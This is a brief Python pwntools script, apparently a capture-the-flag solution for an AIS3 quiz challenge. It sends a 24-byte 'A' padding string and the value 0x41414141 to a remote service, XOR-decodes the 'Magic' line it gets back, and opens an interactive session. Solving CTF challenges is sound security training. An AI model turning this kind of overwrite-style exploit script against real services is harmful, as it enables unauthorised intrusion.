from pwn import *

conn = remote('quiz.ais3.org', 56746)
conn.sendline('A'*24)
conn.sendline('1094795585')
conn.sendline('1')
conn.recvuntil("Magic :")
s = conn.recvline()
ary = []
for i in s:
    ary.append(chr(ord(i) ^ ord('A')))

print ''.join(ary)
conn.interactive()
